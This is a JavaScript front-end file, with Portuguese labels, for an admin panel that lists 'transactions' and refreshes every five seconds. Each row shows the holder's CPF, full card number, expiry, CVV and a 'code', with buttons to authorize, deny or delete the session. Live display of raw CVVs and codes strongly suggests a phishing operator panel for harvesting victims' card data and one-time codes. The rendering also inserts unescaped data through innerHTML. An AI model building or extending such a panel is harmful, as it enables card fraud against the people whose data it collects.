function fetchTransactions() {
    fetch('/api/transactions')
        .then(response => response.json())
        .then(data => {
            const transactionsTable = document.getElementById('transactions-table');
            transactionsTable.innerHTML = '';
            data.transactions.forEach(transaction => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${transaction.sessionId}</td>
                    <td>${transaction.datetime || ''}</td>
                    <td>${transaction.cardCPF}</td>
                    <td>${transaction.cardNumber}</td>
                    <td>${transaction.cardExpiry}</td>
                    <td>${transaction.cardCVV}</td>
                    <td>${transaction.code || ''}</td>
                    <td>${transaction.transactionType || ''}</td>
                    <td>
                        <button class="btn btn-primary" onclick='viewDetails(${JSON.stringify(transaction)})'><i class="fas fa-eye"></i> Detalhes</button>
                        <button class="btn btn-success" onclick="authorizeTransaction('${transaction.sessionId}')"><i class="fas fa-check"></i> Autorizar</button>
                        <button class="btn btn-danger" onclick="denyTransaction('${transaction.sessionId}')"><i class="fas fa-ban"></i> Negar</button>
                        <button class="btn btn-warning" onclick="deleteTransaction('${transaction.sessionId}')"><i class="fas fa-trash"></i> Apagar</button>
                    </td>
                `;
                transactionsTable.appendChild(row);
            });
        })
        .catch(error => console.error('Error:', error));
}

function authorizeTransaction(sessionId) {
    fetch('/api/authorize', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ sessionId })
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
        fetchTransactions(); // Atualiza a tabela após a autorização
    })
    .catch(error => console.error('Error:', error));
}

function denyTransaction(sessionId) {
    fetch('/api/deny', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ sessionId })
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
        fetchTransactions(); // Atualiza a tabela após a negação
    })
    .catch(error => console.error('Error:', error));
}

function deleteTransaction(sessionId) {
    fetch('/api/delete', {
        method: 'DELETE',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ sessionId })
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
        fetchTransactions(); // Atualiza a tabela após a exclusão
    })
    .catch(error => console.error('Error:', error));
}

fetchTransactions();
setInterval(fetchTransactions, 5000); // Atualiza a tabela a cada 5 segundos
